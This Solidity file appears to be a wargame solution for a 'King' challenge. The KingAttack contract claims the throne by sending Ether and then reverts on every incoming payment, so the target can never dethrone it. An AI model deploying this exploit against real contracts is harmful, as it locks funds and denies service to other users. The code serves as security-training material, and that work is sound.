// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface King {
    receive() external payable;
    function prize() external view returns (uint256);
    function _king() external view returns (address);
}

contract KingAttack {
    King public kingContract;
    address constant attacker = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    constructor (address payable _kingAddress) {
        kingContract = King(_kingAddress);
    }

    function attack() external payable {
        require(msg.value >= kingContract.prize(), "Not enough Ether to attack");

        (bool success, ) = address(kingContract).call{value: msg.value}("");
        require(success, "Attack failed");
    }

    receive() external payable {
        revert("I don't accept Ether");
    }
}
